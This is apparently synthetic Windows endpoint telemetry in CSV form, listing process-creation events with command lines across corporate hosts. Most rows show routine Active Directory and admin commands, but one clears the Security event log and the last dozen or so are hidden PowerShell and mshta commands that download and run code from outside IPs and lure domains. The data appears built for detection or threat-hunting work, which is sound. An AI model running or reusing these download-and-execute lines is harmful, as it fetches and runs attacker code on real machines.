2026-02-24T11:06:40.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c dnscmd /enumzones,31032,explorer.exe,31312,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,be7f7e14e4428cc84843e54d15975db3
2026-02-12T11:01:55.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c netdom query fsmo,31503,explorer.exe,31707,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,f6cce560c418cbff15bc547fda0319fd
2026-02-13T09:23:17.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c repadmin /showrepl,31869,explorer.exe,32026,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,a9e64d9cf19d0796165fa6859a30b000
2026-02-09T11:01:48.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-ADForest""",32204,explorer.exe,32501,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,693365aae2a935ea67d351eb1f41897a
2026-02-10T10:31:19.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-ADDomain""",32560,explorer.exe,32770,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,4f2f99138217e88acc14d81ce86bf06e
2026-02-08T12:08:13.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-ADGroup -Filter * -SearchBase 'OU=Groups,DC=prod,DC=corp,DC=local'""",32851,explorer.exe,33010,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,5538e1f79ad850fac58b053b325cc5bb
2026-02-19T09:44:37.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Move-ADObject -Identity CN=fmuller -TargetPath OU=Admins""",33240,explorer.exe,33462,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,4f19c48fcf9efb0e689fe046e2f20761
2026-02-09T08:45:57.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c wevtutil cl Security,33503,explorer.exe,33603,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,fcaee7c76aa6a557ee9e8ae496db5873
2026-02-10T11:30:39.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c auditpol /get /category:*,33615,explorer.exe,33811,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,e01e0fb761e1437d28a1cc10bf658732
2026-02-07T12:07:59.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-MsolUser -All""",33878,explorer.exe,34167,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,249df7171263f1df77f01318f1b01e50
2026-02-19T09:30:20.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Connect-ExchangeOnline -UserPrincipalName admin@prod.corp.local""",34385,explorer.exe,34552,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,60b13e33c41ecaac06c6987301fb69ff
2026-02-14T08:37:58.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Mailbox -ResultSize Unlimited""",34643,explorer.exe,34714,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,ae40bcd9bf4dcd3db9647434f7497b12
2026-02-25T11:24:33.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""New-PSSession -ComputerName appserver.prod.corp.local""",34826,explorer.exe,34842,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,6bad7c82254e79ce67a8edd180f855c4
2026-02-17T08:25:42.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c icacls C:\Shared /grant Everyone:R,34926,explorer.exe,35150,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,613236f405aa6f226c7685a621f45181
2026-02-06T08:47:03.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c takeown /f C:\Logs /r,35276,explorer.exe,35415,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,fce3c1392a0396349c259f08f438bd4a
2026-02-24T08:15:34.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-WmiObject -Class Win32_BIOS""",35537,explorer.exe,35618,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,d9b04579a3fc8dbce26c26a39a0a1ebe
2026-02-13T11:52:46.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-WmiObject -Class Win32_NetworkAdapterConfiguration""",35686,explorer.exe,35889,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,24f93973e083d62e8af3b40f255e245b
2026-02-19T21:16:32.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-PSDrive""",41102,explorer.exe,54651,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,a532b8c148a001255154ba244ab4c914
2026-02-25T17:37:10.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Command -Module ActiveDirectory""",23619,explorer.exe,29433,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,411b7c9f819eb3792f807e02ce8b94ba
2026-02-05T23:01:54.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-NetIPAddress -AddressFamily IPv4""",27042,explorer.exe,21067,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,d22654ac142b575962917ea95667eb6b
2026-02-16T21:58:22.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-WindowsUpdateLog""",24705,explorer.exe,33072,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,8fe87f70bdfad9bf14ff1797fd0bf421
2026-02-14T00:52:13.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Acl C:\Windows\System32""",55030,explorer.exe,29581,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,983d859fcf683607172a48b550066227
2026-02-12T19:37:15.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Set-Service -Name Spooler -StartupType Automatic""",22824,explorer.exe,60873,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,c1d528ce7c193667f493570032ca9789
2026-02-10T00:25:38.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Counter -Counter '\Processor(_Total)\% Processor Time'""",43894,explorer.exe,35547,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,454070685e6377d28333826dec655f6b
2026-02-25T21:16:39.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c query user,44707,explorer.exe,8879,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,1cd5e88fcac51230103b8329a985f91a
2026-02-03T18:15:43.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c logman query,6492,explorer.exe,5291,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,6af68dd7c609ac9a0006dd986c4e7d1a
2026-02-06T00:19:37.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c diskpart /s C:\scripts\diskpart.txt,8914,explorer.exe,25586,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,6572a5f9d119ffa1be768126b56e762d
2026-02-24T22:20:12.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c netsh wlan show profiles,8321,explorer.exe,5728,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,e18a1850a326104f559ad50d60990964
2026-02-23T17:02:18.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c wmic bios get serialnumber,21412,explorer.exe,18117,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,f92201455c48f093dc61a119fb6722ed
2026-02-03T23:53:33.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Package -Name 'Microsoft Visual C++*'""",15866,explorer.exe,10046,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,0d224fa5a40d50e45d13dc4b09e97fda
2026-02-04T00:31:45.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Uninstall-Package -Name 'OldApp' -Force""",30336,explorer.exe,24135,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,c2697e69cce955e1b188042808332488
2026-02-14T17:59:08.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Module -ListAvailable""",13374,explorer.exe,16441,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,dcaeb121cc4985a3c66cbf56570bc3cc
2026-02-04T18:18:45.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Update-Module -Name Az -Force""",12357,explorer.exe,39568,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,9df0d2564a2d5c1d012f44a7a89507f0
2026-02-18T23:15:57.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,"cmd.exe /c net start ""Windows Update""",34687,explorer.exe,57974,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,3af4ed448d9cba93e9128fdf230e3f13
2026-02-10T18:10:40.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,"cmd.exe /c net stop ""Print Spooler""",19662,explorer.exe,33564,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,e9826b1f4bc06b02403d4f2931d6084f
2026-02-01T23:22:22.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-EventSubscriber""",31412,explorer.exe,23482,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,e27bb60303a39117624be25790113c81
2026-02-01T22:07:03.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -c ""iex(iwr https://212.193.30.21/rd2)""",21814,explorer.exe,20010,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,b3433d9618bcb7c7cca501d353073146
2026-02-02T22:59:46.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -ep bypass -w hidden -c ""irm https://45.141.87.30/rd3 | iex""",17179,explorer.exe,58762,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,c9dd9ec4d4defc8550fa8a59bdf9dcd2
2026-02-03T16:45:44.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,powershell.exe -WindowStyle Hidden -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwA3ADcALgA5ADEALgA2ADgALgAyADAALwByAGQANAApAA==,60019,explorer.exe,32752,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,dac183d0753d1a3d40ff1d43baccde4d
2026-02-04T17:52:57.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -c ""IEX(New-Object Net.WebClient).DownloadString('https://179.43.167.55/rd5')""",39157,explorer.exe,42731,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,6e05a5f54c09d4cd9fa8de1873b81e31
2026-02-06T01:27:21.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -nop -w hidden -ep bypass -c ""IEX(irm https://212.193.30.21/rd6)""",30302,explorer.exe,38704,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,cb5f69bfacb06aca5a74be3e456c8dc8
2026-02-07T01:45:52.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -NonInteractive -c ""iex(iwr -UseBasicParsing https://45.141.87.30/rd7)""",18212,explorer.exe,51621,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,9a125acc76feee612ac014ee3b9bf040
2026-02-08T01:56:02.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -ep bypass -c ""IEX(iwr https://77.91.68.20/rd8 -UseBasicParsing)""",33731,explorer.exe,30371,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,45f6884a40e00aa156a969cafec16cc8
2026-02-08T18:48:13.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -c ""irm https://179.43.167.55/rd9 | iex""",8307,explorer.exe,30679,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,d1410d828dcf29be1c0f12a516b70dfa
2026-02-10T01:43:56.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -WindowStyle Hidden -c ""iex(iwr https://212.193.30.21/rd10)""",10739,explorer.exe,59787,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,3c5fd12d1b53268c2e02a5ce83102fe3
2026-02-10T20:52:03.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -nop -ep bypass -w hidden -c ""IEX(irm https://77.91.68.20/rd11)""",50022,explorer.exe,50792,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,32e11750bee613f1d3c62e6146830e44
2026-02-12T00:44:55.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://browser-verify2.store/rd12.hta,25209,explorer.exe,55782,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,e59698a5ffe181fbff3ad13bab2ad0bf
2026-02-13T00:01:46.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://cdn-flash-update2.live/rd13.hta,14520,explorer.exe,50695,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,712df91d955633f62aadefd6b0060cf3
